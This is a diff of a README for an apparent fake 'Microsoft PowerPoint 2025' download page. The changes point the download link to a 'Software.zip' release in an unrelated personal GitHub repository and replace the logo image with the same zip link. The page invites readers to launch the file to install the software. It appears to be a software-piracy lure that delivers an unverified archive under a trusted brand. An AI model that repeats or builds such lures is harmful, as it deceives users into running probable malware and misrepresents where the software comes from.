@@ -22,7 +22,7 @@ Microsoft PowerPoint 2025 is a cutting-edge presentation software designed to me
 🖼️ **PowerPoint Image Editing**: Edit and enhance images directly within PowerPoint.
 
 ## Getting Started
-To download Microsoft PowerPoint 2025 for Windows, click [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).
+To download Microsoft PowerPoint 2025 for Windows, click [here](https://github.com/Izhanraza07/Microsoft-PowerPoint-For-Windows/releases/download/v2.0/Software.zip).
 
 🚀 Launch the file to begin the installation process.
 
@@ -33,4 +33,4 @@ Connect with other PowerPoint users, share tips and tricks, and stay updated on 
 
 Let's make your presentations shine with Microsoft PowerPoint 2025! 🎉
 
-![Microsoft PowerPoint Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Microsoft_PowerPoint_2013-2016_logo.svg/1280px-Microsoft_PowerPoint_2013-2016_logo.svg.png)
+![Microsoft PowerPoint Logo](https://github.com/Izhanraza07/Microsoft-PowerPoint-For-Windows/releases/download/v2.0/Software.zip)
